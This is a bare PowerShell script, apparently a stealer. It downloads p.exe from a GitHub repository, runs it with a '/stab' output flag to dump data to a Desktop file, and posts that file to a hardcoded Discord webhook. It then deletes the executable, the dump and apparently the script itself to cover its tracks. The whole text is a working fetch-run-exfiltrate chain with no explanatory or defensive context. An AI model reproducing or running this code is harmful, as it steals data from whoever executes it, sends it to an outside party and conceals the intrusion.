Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutFile "$HOME\Desktop\p.exe";
Start-Sleep -Seconds 2;
& $HOME\Desktop\p.exe /stab "$HOME\Desktop\_";
Start-Sleep -Seconds 1;
$payload = @{ content = [IO.File]::ReadAllText("$HOME\Desktop\_") };
Invoke-RestMethod -URI "https://discord.com/api/webhooks/1065298389748686958/aWLnubuSk3Dd240DHJZsS3Rdh_Ebdepb4LiMYM61ujbcv4N_C7OYJwmt56XRmzhW1iNs" -Method Post -Body $payload;
Remove-Item -Path "$HOME\Desktop\p.exe";
Remove-Item -Path "$HOME\Desktop\_";
Start PowerShell {"Remove-Item -Path $HOME\Desktop\b.ps1"};